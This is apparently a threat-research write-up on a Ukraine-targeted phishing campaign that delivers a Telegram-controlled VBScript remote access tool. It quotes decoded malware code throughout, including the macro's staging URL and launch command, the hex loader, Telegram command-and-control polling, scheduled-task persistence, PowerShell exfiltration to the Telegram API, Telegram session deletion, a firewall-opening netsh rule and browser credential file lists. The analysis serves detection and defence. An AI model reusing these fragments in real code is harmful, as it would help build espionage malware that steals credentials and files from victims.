# Ukraine-Targeted Phishing Delivers a Telegram-Controlled VBScript RAT with an Unusual Collection Profile

## Introduction

We found a phishing campaign targeting Ukrainian users with macro-enabled Office documents that deliver a VBScript remote access tool controlled through the Telegram Bot API.

The macro downloads a second stage from GitHub raw hosting, saves it under a `.dll` filename, and executes it as VBScript. The payload is a 2667 line RAT that harvests browser credentials, steals Telegram Desktop sessions, and collects files from the victim system.

Two weaponized documents are known, first seen on 2026-08-26 and 2026-09-16. One uses an air raid alert theme that works against any Ukrainian recipient. The other is a unit materiel inventory aimed at military personnel handling property records.

The file collection module is what makes the sample worth writing up. It carries no cryptocurrency wallet code, which commodity stealers essentially always ship, and targets CAD, BIM, GIS, LiDAR and numerical weather prediction data instead.

This post covers the full chain from the macro through the loader to the implant, including the deobfuscation, the Telegram command and control design, the serial-number host addressing and the collection logic. All code excerpts are taken from the decoded payload.

## Key points

* Two weaponized Office documents aimed at Ukrainian targets between late August and mid September 2026, with lure themes at opposite ends of the targeting spectrum.
* A macro retrieves a second stage from GitHub raw hosting, saves it as `Microsoft Excel.dll`, and runs it as VBScript through `wscript.exe //E:VBScript`.
* The payload is a 2667 line VBScript RAT stored as 978 hex chunks, decoded at runtime and handed to `ExecuteGlobal`.
* Command and control runs over the Telegram Bot API with three rotating bot tokens. Hosts are tasked individually by BIOS serial number, with an `ALL` broadcast.
* The file collection module carries no cryptocurrency wallet code at all. It targets CAD, BIM, GIS, LiDAR and numerical weather prediction data instead.
* Dead code in the self-destruct routine points to an earlier build of the same family that included keylogging and used different artifact names.

## The lures

Two documents are known, `ПОВІТРЯНА ТРИВОГА.docm` translates as "air raid alert". It was first submitted from Ukraine on 2026-09-16. Air raid alerting is a daily reality for the entire Ukrainian population, so this lure works against essentially any recipient in the country.

`Майно_НРК_на_підрозділах_станом_на_25_08_2026_23.xlsm` was first seen on 2026-08-26. The filename reads as a materiel inventory held at subunits, current as of 25.08.2026. `Підрозділ` is standard Ukrainian military and paramilitary terminology for a subunit, and `майно` in this construction means property or materiel rather than general goods. The file was uploaded one day after the date written into its own name, so the operator built it around a current or plausibly current record.

These two documents do not target the same person. One reaches anybody in the country. The other reaches somebody whose job involves unit property accounting.

## Stage one: the macro

The macro runs on `Document_Open`. Until macros are enabled the document body is held scrambled through document variables and simple rotation ciphers, with `ScrambleWord` and `UnscrambleWord` restoring readable text after the user clicks Enable Content. A victim who declines sees noise, which is the point.

`DownloadAndRunGoogleDoc` then fetches the second stage over `MSXML2.XMLHTTP` from:

```
https://raw.githubusercontent.com/er782sdfsdf/123/main/Microsoft%20Excel.dll
```

The response is written to `%TEMP%` with `ADODB.Stream`. Despite the `.dll` name the file is not a PE. It is launched as script:

```
wscript.exe //E:VBScript
```

The `//E:` switch names the engine explicitly, so the extension does not matter at execution time. Calling a VBScript `Microsoft Excel.dll` defeats extension-based blocking and looks unremarkable in a `%TEMP%` listing.

Using GitHub raw hosting for staging is worth noting on its own. The traffic is TLS to a domain almost no organisation blocks, there is no attacker-owned infrastructure to seize, and the operator can swap the payload at any time without touching the documents already in flight.

## Stage two: unwrapping the loader

The staged file holds its payload in an array of 978 hex strings:

```vbscript
Dim d805546, c633423
ReDim c633423(977)
c633423(0) = "FFFE4F007000740069006F006E00200045007800700..."
c633423(1) = "440069006D0020004C004100530054005F00460049..."
```

The chunks are concatenated and passed to a decoder that leans on MSXML for hex conversion rather than implementing it in VBScript:

```vbscript
Function fnHexDecode(s)
    On Error Resume Next
    Dim stm, xml, el, bytes
    If Len(s) Mod 2 <> 0 Then fnHexDecode = "": Exit Function
    Set xml = CreateObject("MSXML2.DOMDocument.6.0")
    Set el = xml.createElement("x")
    el.dataType = "bin.hex"
    el.text = s
    bytes = el.nodeTypedValue
    Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1 : stm.Open
    stm.Write bytes
    stm.Position = 0
    stm.Type = 2
    stm.Charset = "unicode"
    fnHexDecode = stm.ReadText
    stm.Close
End Function
```

Setting `dataType = "bin.hex"` on a DOM element and reading `nodeTypedValue` performs byte conversion without a loop. `ADODB.Stream` with `Charset = "unicode"` then reinterprets those bytes as UTF-16LE. The `FFFE` at the head of the first chunk is the byte order mark, stripped immediately afterwards.

The next few lines are the detail worth pausing on:

```vbscript
If AscW(Left(dec, 1)) = &HFEFF Then dec = Mid(dec, 2)
Dim firstLineEnd, firstLine
firstLineEnd = InStr(dec, vbCrLf)
If firstLineEnd > 0 Then
    firstLine = LCase(Trim(Left(dec, firstLineEnd - 1)))
    If firstLine = "option explicit" Then dec = Mid(dec, firstLineEnd + 2)
End If
ExecuteGlobal dec
```

`ExecuteGlobal` refuses `Option Explicit`, so the loader removes it before execution. The author did not write the payload to be embedded. They wrote it as a standalone script, with `Option Explicit` at the top the way you would in an editor, and wrapped it afterwards. The strip is a workaround for their own build process, and it tells you the obfuscation layer is a packaging step applied to finished code rather than something integral.

A deobfuscator that does not depend on the array name, which is very likely randomized per build:

```python
import re, sys

def deobfuscate(path):
    with open(path, "r", errors="ignore") as fh:
        blob = fh.read()
    chunks = re.findall(r'"([0-9A-Fa-f]{64,})"', blob)
    text = bytes.fromhex("".join(chunks)).decode("utf-16-le")
    return text.lstrip("\ufeff")

if __name__ == "__main__":
    sys.stdout.write(deobfuscate(sys.argv[1]))
```

Decoded, the payload runs to 2667 lines across 74 procedures with no further obfuscation. Strings, tokens and command names are all plaintext.

## Transport

The RAT does not assume any particular HTTP stack exists. It walks a fallback chain:

```vbscript
Sub CreateHTTPObject()
    On Error Resume Next
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number = 0 And Not http Is Nothing Then Exit Sub
    Err.Clear
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number = 0 And Not http Is Nothing Then Exit Sub
    Err.Clear
    Set http = CreateObject("MSXML2.XMLHTTP")
    If Err.Number = 0 And Not http Is Nothing Then Exit Sub
    Err.Clear
    Set http = CreateObject("Microsoft.XMLHTTP")
    If Err.Number = 0 And Not http Is Nothing Then Exit Sub
    Set http = Nothing
End Sub
```

It then checks what it actually received, because only WinHttp supports the async pattern it wants for long polling:

```vbscript
tname = TypeName(http)
isWinHttp = InStr(1, tname, "WinHttp", 1) > 0
If isWinHttp Then
    http.Open "GET", url, True
    http.SetTimeouts 5000, 5000, 10000, 25000
    http.SetRequestHeader "User-Agent", "VBScript-Monitor-Bot/1.0"
    http.Send
    If http.WaitForResponse(25) = False Then Set http = Nothing : Exit Sub
Else
    http.Open "GET", url, False
    ...
End If
```

Four COM objects and a runtime capability check is more engineering care than this malware shows anywhere else, which suggests the author expects a heterogeneous estate including older or stripped Windows builds.

Polling uses Telegram long polling with a 20 second server-side timeout, and a 3000 millisecond sleep between cycles:

```
https://api.telegram.org/bot<token>/getUpdates?offset=<last+1>&limit=10&timeout=20
```

The main loop counts consecutive failures. After five it sleeps a second longer per cycle, and after ten it tears down the HTTP object entirely and sleeps five seconds before rebuilding. On repeated failure it also runs `ping 127.0.0.1 -n 1`, which is being used purely as a delay primitive.

## Token rotation

Three bot tokens are hardcoded. On an authentication or not-found response the RAT advances to the next and resets its update offset:

```vbscript
ElseIf http.Status = 401 Or http.Status = 403 Or http.Status = 404 Then
    If SwitchToNextToken() Then Call SendMessage("Restarted")
    Set http = Nothing
End If
```

Revoking one bot does not remove the operator's access. It costs them a rotation. Any takedown effort needs all three revoked together, and the implants will keep polling regardless.

## Parsing JSON without a JSON parser

VBScript has no JSON support and the author did not reach for a script control or .NET. They count braces:

```vbscript
resultStart = InStr(jsonResponse, """result"":[")
currentPos = resultStart + 10
Do
    messageStart = InStr(currentPos, jsonResponse, "{""update_id"":")
    If messageStart = 0 Then Exit Do
    braceCount = 0
    messageEnd = 0
    maxLength = Len(jsonResponse)
    If maxLength > 50000 Then maxLength = 50000
    For i = messageStart To maxLength
        If Mid(jsonResponse, i, 1) = "{" Then
            braceCount = braceCount + 1
        ElseIf Mid(jsonResponse, i, 1) = "}" Then
            braceCount = braceCount - 1
            If braceCount = 0 Then
                messageEnd = i
                Exit For
            End If
        End If
    Next
```

The brace counter is not string-aware, so a literal brace inside a message body desynchronizes the parse. The hard 50000 character ceiling silently truncates long update responses. Both are stable across rebuilds in a way the hex wrapper is not, which makes them better behavioural anchors than anything in the loader.

Once a message object is isolated, the code wraps it back into a synthetic envelope so the same extractors work on both a full response and a single message:

```vbscript
wrappedJSON = "{""ok"":true,""result"":[" & msgJSON & "]}"
msgText     = ExtractMessageText(wrappedJSON)
msgChatId   = ExtractChatId(wrappedJSON)
msgUpdateId = ExtractUpdateId(wrappedJSON)
```

The extractors are `InStr` and `Mid` against fixed key strings, with a hand-written `\uXXXX` unescape routine over the message text. That unescape is not decorative. Operators tasking Ukrainian hosts will be sending Cyrillic file paths, and Telegram escapes them.

## Outbound message encoding

Replies go out as `application/x-www-form-urlencoded` through a hand-rolled encoder:

```vbscript
Function EncodeForPost(text)
    Dim s
    s = Replace(text, "%", "%25")
    s = Replace(s, "&", "%26")
    s = Replace(s, "+", "%2B")
    s = Replace(s, "=", "%3D")
    s = Replace(s, "#", "%23")
    s = Replace(s, vbCrLf, "%0A")
    s = Replace(s, vbCr,   "%0A")
    s = Replace(s, vbLf,   "%0A")
    s = Replace(s, Chr(9), "%09")
    s = Replace(s, """",   "%22")
    s = Replace(s, " ",    "%20")
    If Len(s) > 3800 Then s = Left(s, 3800) & "%0A...(truncated)"
    EncodeForPost = s
End Function
```

The substitution order is correct, with `%` handled first so later replacements are not double-encoded. The coverage is not. Non-ASCII is never encoded, so Cyrillic filenames returned by a directory listing go into the POST body raw. The 3800 character cap is there because Telegram caps `sendMessage` at 4096, which means large directory listings come back clipped.

There is also an inconsistency worth noting. `CheckMessages` builds its transport through the four-object fallback chain. `SendMessageToChat` does not, and instantiates `MSXML2.XMLHTTP` directly with no fallback at all. On a host where that object is unavailable the implant would receive commands and silently fail to answer.

## Multiple operators and mutable configuration

The hardcoded operator chat ID is only a default. Configuration is persisted in plaintext beside the implant:

```vbscript
Set fileStream = fso.CreateTextFile(CONFIG_FILE, True)
If Err.Number = 0 Then
    fileStream.WriteLine "USER=" & CURRENT_USER_ID
    fileStream.WriteLine "ADMINS=" & Join(ADMIN_USER_IDS, ",")
    fileStream.Close
End If
```

`%APPDATA%\SysMonPort\config.dat` is read at startup and overrides the compiled-in values. A separate admin command set manages it at runtime:

```
/admin_setuser ALL <id>      repoint every implant to a new operator account
/admin_listusers
/admin_listadmins
/admin_addadmin <id>
/admin_removeadmin <id>
/admin_help
```

This matters for detection and for takedown planning. The operator chat ID in this sample is an initial value, not a fixed property of the family. An operator who loses an account can move the entire estate to a new one with a single broadcast, and the change survives reboot.

The admin listing skips entries containing the literal `HERE`:

```vbscript
If InStr(ADMIN_USER_IDS(i), "HERE") = 0 Then
```

That is a builder artifact. The template ships with placeholder values along the lines of `PUT_ID_HERE`, and the filter exists so unfilled slots do not appear in operator output. This build has the placeholders replaced, so it is an operational rather than a test copy.

## Host addressing

Every command carries a target. The implant resolves its own identity from the BIOS serial number and compares:

```vbscript
Function CommandMatchesSN(msg)
    msg = NormalizeMsg(msg)
    parts = Split(msg, " ")
    If UBound(parts) < 1 Then CommandMatchesSN = False : Exit Function
    snToken = CleanSN(parts(1))
    mySN = CleanSN(SERIAL_NUMBER)
    CommandMatchesSN = (snToken = "ALL" Or snToken = mySN)
End Function
```

`CleanSN` strips everything non-alphanumeric and uppercases the remainder, so the operator can type a serial with or without punctuation. The second token of any command is the target and `ALL` addresses the whole estate. `RemoveSN` then rebuilds the command with the serial token removed before dispatch, so the handlers never see it. Replies are prefixed through `WithSN`, which is what makes a single Telegram chat usable across many victims.

The serial comes from `wmic bios get serialnumber`, with a filter over known placeholder values:

```vbscript
bad = Array("", "DEFAULT STRING", "TO BE FILLED", "DEFAULT", "NONE", _
            "SYSTEM SERIAL NUMBER", "0123456789", "0000000000000000", _
            "FFFFFFFFFFFFFFFF", "123456789", "MSI")
```

Anything matching, shorter than four characters, or containing `OEM` falls back to `%COMPUTERNAME%`. Virtual machines and whiteboxes still receive a stable identifier, which also means sandbox detonations produce a usable ID rather than a collision.

## Persistence, and why it prefers a user context

Four mechanisms are installed. The hidden copy, the Run key and the Startup stub are unremarkable. The scheduled task is not:

```vbscript
If CheckTaskExists(taskName) And TaskRunsAsSystem(taskName) Then
    shell.Run "schtasks /Delete /TN """ & taskName & """ /F", 0, True
    WScript.Sleep 400
End If
If Not CheckTaskExists(taskName) Then
    taskCmd = "schtasks /Create /TN """ & taskName & """ /TR ""wscript.exe """ & hideLocation & """"" /SC ONLOGON /RU """ & runAsUser & """ /F"
    shell.Run taskCmd, 0, True
    If Not CheckTaskExists(taskName) Then
        taskCmd = "schtasks /Create /TN """ & taskName & """ /TR ""wscript.exe """ & hideLocation & """"" /SC ONLOGON /RU ""SYSTEM"" /RL HIGHEST /F"
        shell.Run taskCmd, 0, True
    End If
End If
```

Read the order. If a task already exists and runs as SYSTEM, the RAT deletes it and recreates it under the interactive console user. It only escalates to `SYSTEM /RL HIGHEST` when user-level creation fails.

Malware usually moves the other way. The reason it does not here is the screenshot implementation, which drives the keyboard and reads the clipboard:

```powershell
[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
Start-Sleep -Milliseconds 700
if (-not [System.Windows.Forms.Clipboard]::ContainsImage()) { exit 1 }
$img = [System.Windows.Forms.Clipboard]::GetImage()
```

That needs an interactive desktop and a clipboard. A SYSTEM task in session 0 has neither. The operator would rather run with lower privilege and keep screenshots than run high and lose them. `GetActiveConsoleUser`, which parses `query user` output to find the account holding the active session, serves the same goal.

Note also that the capture method is destructive to the victim's own clipboard, and that a user watching the screen may notice their clipboard contents being replaced by a screenshot.

There is a related fallback when the AppData path is unusable:

```
icacls "C:\ProgramData\SystemPortalScreenCap" /grant Users:(OI)(CI)F /Q
```

A world-writable directory under `ProgramData` is both an artifact and a local privilege escalation opportunity for anyone else on the box.

## PowerShell as a service layer

Nearly every capability follows one pattern. VBScript builds a PowerShell script as a string, writes it to a hidden file in the working directory, runs it with output redirected to a temp file, reads that file back, parses a sentinel token, and deletes both. `DeleteTelegramTdata` is the shortest example:

```vbscript
psDeleteScript = "$ErrorActionPreference = 'SilentlyContinue'" & vbCrLf & _
                 "$telegramPath = ""$env:APPDATA\\Telegram Desktop\\tdata""" & vbCrLf & _
                 "if (Test-Path $telegramPath) {" & vbCrLf & _
                 "    try {" & vbCrLf & _
                 "        Remove-Item -Path $telegramPath -Recurse -Force -ErrorAction Stop" & vbCrLf & _
                 "        Write-Host ""DELETED""" & vbCrLf & _
                 "    } catch {" & vbCrLf & _
                 "        Write-Host ""ERROR""" & vbCrLf & _
                 "    }" & vbCrLf & _
                 "} else {" & vbCrLf & _
                 "    Write-Host ""NOT_FOUND""" & vbCrLf & _
                 "}"
```

Sentinels across the implant include `SUCCESS`, `DELETED`, `NOT_FOUND`, `ERROR_FILE_NOT_FOUND`, `ERROR_FILE_EMPTY`, `ERROR_API_RESPONSE`, `ERROR_HTTP_<code>`, `ERROR_NOT_FOUND`, `ERROR_CREATE_FAILED`, `SERVER_STARTED:<port>`, `STOPPED` and `COMPLETE:<count>`. This string-based IPC between two interpreters is the architectural core of the implant and also the loudest thing about it. Every operator action drops a plaintext `.ps1`, spawns `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File`, and writes a temp file.

Worth noting for responders: those `.ps1` files are deleted immediately after use, but they are written unencrypted and are recoverable from disk. They are the clearest possible record of what the operator asked for on a given host.

## Exfiltration mechanics

Document upload builds a `multipart/form-data` body by hand in PowerShell rather than using `Invoke-RestMethod`:

```powershell
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$fileName = [System.IO.Path]::GetFileName($filePath)
$fullFileName = '<SERIAL>_' + $fileName
$bodyLines = @()
$bodyLines += "--$boundary"
$bodyLines += "Content-Disposition: form-data; name=""chat_id"""
$bodyLines += ""
$bodyLines += $chatId
...
$bodyText = ($bodyLines -join $LF) + $LF
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyText)
$endBytes = [System.Text.Encoding]::UTF8.GetBytes($LF + "--$boundary--" + $LF)
$totalBytes = $bodyBytes + $fileBytes + $endBytes
$webRequest = [System.Net.WebRequest]::Create($uri)
$webRequest.Method = 'POST'
$webRequest.ContentType = "multipart/form-data; boundary=$boundary"
$webRequest.ContentLength = $totalBytes.Length
```

Two things fall out of this. Every exfiltrated file is renamed with the host serial as a prefix, so the operator can sort collections by machine directly in the Telegram chat. And `$totalBytes = $bodyBytes + $fileBytes + $endBytes` is PowerShell array concatenation, which allocates a fresh array and copies. Against the implant's own 50 MB ceiling this briefly holds multiple copies of the file in memory, a noticeable spike on a small host.

Size limits are enforced client side before upload: 50 MB for documents and archives, 10 MB for screenshots. Oversized files produce an error message to the operator rather than an attempt.

The photo path is inconsistent with the document path. It tries `curl.exe` first, testing for its presence with `curl --version`, and only falls back to PowerShell using `Invoke-RestMethod`. Three different HTTP approaches across one implant suggests the capabilities were written at different times, or by different hands.

## Second stage delivery

`/load_file` pulls attacker-supplied files down through Telegram. The implant tracks the `file_id` of the most recent document sent to the chat, then performs the standard two-step retrieval:

```vbscript
getFileUrl = "https://api.telegram.org/bot" & activeToken & "/getFile?file_id=" & LAST_FILE_ID
...
filePathStart = InStr(response, """file_path"":""")
filePathStart = filePathStart + 13
filePathEnd = InStr(filePathStart, response, """")
filePathOnServer = Mid(response, filePathStart, filePathEnd - filePathStart)
downloadUrl = "https://api.telegram.org/file/bot" & activeToken & "/" & filePathOnServer
```

The download itself is handed to PowerShell `System.Net.WebClient`. Combined with `/run_file`, this is the mechanism by which anything else in the operator's toolkit reaches the host, and it explains why the VBScript itself contains no additional payload URLs. Everything after initial access arrives operator-driven over Telegram.

## The TCP listener is less than it appears

`/tcp_start <port>` and `/firewall_open <port> [TCP|UDP]` look like the makings of a pivot capability. The implementation is not:

```powershell
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)
$listener.Start()
while ($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $buffer = New-Object byte[] 1024
    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
    if ($bytesRead -gt 0) {
        $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
        "Received: $data" | Out-File -FilePath $logFile -Append -Encoding UTF8
        $response = "Echo: $data"
        ...
    }
    $client.Close()
}
```

It is an echo server. Single threaded, one 1024 byte read per connection, ASCII only, no command handling, logging to `tcp_server.log` in the working directory. It does not provide shell access and it does not relay traffic. What it does provide is a way to confirm that a given port on a given host is reachable from outside, with the firewall command opening the path:

```
netsh advfirewall firewall add rule name="RemoteBot_Port_<port>" dir=in action=allow protocol=<proto> localport=<port>
```

Treat this as reachability testing or as an unfinished capability rather than a backdoor. It is still worth alerting on, because a host punching an inbound firewall hole and listening is abnormal regardless of what the listener does.

## Collection

Browser theft covers Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, Yandex and Firefox. Chromium profiles yield `Login Data`, `Login Data For Account`, `Cookies`, `Network\Cookies`, `Web Data`, `History`, `Bookmarks` and `Preferences`. Firefox yields `key4.db`, `key3.db`, `logins.json`, `cert9.db`, `cookies.sqlite`, `favicons.sqlite`, `places.sqlite`, `formhistory.sqlite` and `permissions.sqlite`, iterated across every profile directory. Each browser is staged into a temporary tree, zipped separately, uploaded, and the archive deleted. A small `info.txt` recording browser name, collection time, file count, computer name and username goes into each archive.

There is no attempt to decrypt anything. No DPAPI calls, no master key extraction from `Local State`, no SQLite parsing. The implant takes the raw files and leaves decryption to the operator offline. That is a design decision with a detection consequence: there is no credential-decryption behaviour to catch, only file copying.

Telegram Desktop is handled differently. The implant terminates Telegram, gracefully first and then forcibly, waiting up to ten seconds:

```powershell
$proc.CloseMainWindow() | Out-Null
Start-Sleep -Milliseconds 500
if (-not $proc.HasExited) { Stop-Process -Id $proc.Id -Force }
```

It then copies `tdata` while excluding a long list of runtime and cache items, `dumps`, `emoji`, `user_data` through `user_data#6`, `tdummy`, `Telegram.exe`, `Updater.exe`, `modules`, `log.txt` and others, which keeps the archive to the session material that actually matters. It zips, uploads, and then deletes the victim's `tdata` outright.

That final step is a deliberate trade. Destroying the local session logs the victim out and guarantees quick discovery. It also removes the device they would normally use to review and terminate active sessions. The operator is accepting fast detection in exchange for exclusive control of the stolen session, which only makes sense if the session is worth more than continued access to the machine.

## The file targeting

The default extension list is where this sample separates itself from commodity tooling:

```
.dwg .dxf .dwf .dgn .rvt        CAD and BIM
.step .stp .iges .igs .sat      3D exchange formats
.stl .obj .ply                  mesh
.shp .kml .kmz .geotiff         GIS
.las .laz .e57 .ptx .pts .xyz   LiDAR and laser scan point clouds
.hdf .hdf5 .nc .grib .grib2     scientific arrays and numerical weather prediction
.mpp .vsd .vsdx                 project schedules and diagrams
```

alongside the expected office, archive and database formats.

There is no cryptocurrency wallet code anywhere in the sample. No `wallet.dat`, no browser extension identifiers for MetaMask or similar, no desktop wallet paths. Commodity stealers essentially always carry them, because that is the shortest path to money.

GRIB and NetCDF are the entries that stand out. These are numerical weather prediction outputs. There is no resale market for stolen weather model data. Put them next to terrain point clouds, mapping data and infrastructure drawings, delivered by a lure written for military unit property staff, and the collection profile stops describing a monetization scheme.

Enumeration runs across every fixed drive rather than user directories:

```powershell
$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null }
foreach ($drive in $drives) {
    $files = Get-ChildItem -Path "$($drive.Name):\\" -Recurse -File -ErrorAction SilentlyContinue
```

Results are written to CSV with full path, filename, extension, size in bytes, size in megabytes and last modified time, then uploaded. The operator receives an inventory first and requests specific files afterwards, which keeps exfiltration volume low enough to sit under the 50 MB per file ceiling and under most egress anomaly thresholds.

Discovery also accepts an optional date filter, parsed positionally against `dd.MM.yyyy`:

```vbscript
If tok <> "" And Len(tok) = 10 Then
    If Mid(tok,3,1)="." And Mid(tok,6,1)="." Then
        If IsNumeric(Left(tok,2)) And IsNumeric(Mid(tok,4,2)) And IsNumeric(Right(tok,4)) Then
            isDateCandidate = True
        End If
    End If
End If
```

Present, it becomes a `LastWriteTime -ge` comparison in the generated PowerShell. The operator can ask a host for only what has changed since the last visit. That is a design for repeat collection against the same machines over time.

## Evidence of an earlier build

The self-destruct routine does not clean up what this build installs:

```vbscript
shell.Run "schtasks /Delete /TN ""Windows System Portal"" /F", 0, True
shell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemPortal"
startupVbs = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSystemPortal.vbs"
```

This build creates a task named `SysMonPort`, a Run value named `SysMonPort`, and a startup stub named `SysMonPort.vbs`. The teardown targets `Windows System Portal`, `SystemPortal` and `WindowsSystemPortal.vbs`. None of them exist on a host infected by this sample. The routine was written against an earlier variant and never updated when the artifact names changed.

The temp file cleanup list in the same routine is more interesting:

```vbscript
tempFiles = Array("screenshot.jpg", "send_document.ps1", "find_docs.ps1", "documents_list.csv", _
                  "send_photo.ps1", "keylogger.ps1", "collect_telegram.ps1", "telegram_output.tmp", _
                  "Telegram_tdata.zip", "collect_browsers.ps1", "browser_output.tmp", _
                  "delete_tdata.ps1", "archive_folder.ps1", "archive_output.tmp", "folder_archive.zip")
```

`keylogger.ps1` appears nowhere else in the sample. There is no keylogging capability in this build, no command that would invoke it, and no code that writes that file. An earlier version of this family had one.

Both observations are useful for clustering. If you hunt for `Windows System Portal`, `SystemPortal`, `WindowsSystemPortal.vbs` or `keylogger.ps1` alongside the Telegram and hex-loader patterns, you should surface predecessors of this build rather than only siblings of it.



## Conclusion

The implementation is careless. Bot tokens sit in plaintext, the obfuscation is hex encoding, there is no anti-analysis anywhere in 2667 lines, and every capability writes plaintext PowerShell to disk before shelling out to monitored binaries. Three separate HTTP implementations and a teardown routine pointing at artifact names from an older build indicate no code review.

The targeting is not careless. The wallet stealing that generic builders ship with has been removed and replaced with CAD, BIM, GIS, LiDAR and numerical weather prediction formats. Host tasking runs by BIOS serial number with an `ALL` broadcast, file discovery accepts a date filter built for repeat visits to the same machine, and the two lures cover a general Ukrainian audience and one specific military administrative role.

Dead code in the self-destruct routine references a scheduled task, a registry value, a startup stub and a `keylogger.ps1` that this build never creates. An earlier version of this family existed, it had keylogging, and it used different names.

The gap between the implementation and the intent behind it is the finding.

## Indicators of compromise

### Samples

| SHA256 | File |
|---|---|
| `2b86f53965e6bf5ae33658293d3977894c8f31d7a86df9c24a677e020af0a3a3` | `ПОВІТРЯНА ТРИВОГА.docm` |
| `2edb9dd4df9c8ebe605fd5807b94d472392ea95b0cb6a517b659d10192f83c80` | `Майно_НРК_на_підрозділах_станом_на_25_08_2026_23.xlsm` |
| `523f21fad7e3e8c4ffd9897b875c0df9609a825fd0c9d274319da132fa358cb9` | VBScript RAT, staged as `Microsoft Excel.dll` |

